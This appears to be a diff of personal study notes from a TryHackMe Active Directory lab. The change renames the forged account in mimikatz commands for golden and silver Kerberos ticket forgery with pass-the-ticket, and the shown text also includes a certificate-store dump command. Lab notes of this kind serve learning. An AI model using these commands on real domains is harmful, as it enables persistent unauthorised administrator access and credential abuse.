@@ -721,11 +721,11 @@ The ingredetients we need:
 *All the other information can be found on a dc sync*
 
 **Golden ticket**
-`mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`
+`mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`
 
 **Silver ticket**
 `         
-mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt`
+mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt`
 
 # Generating our own Certificates become CA and make them cry
 `mimikatz # crypto::certificates /systemstore:local_machine`
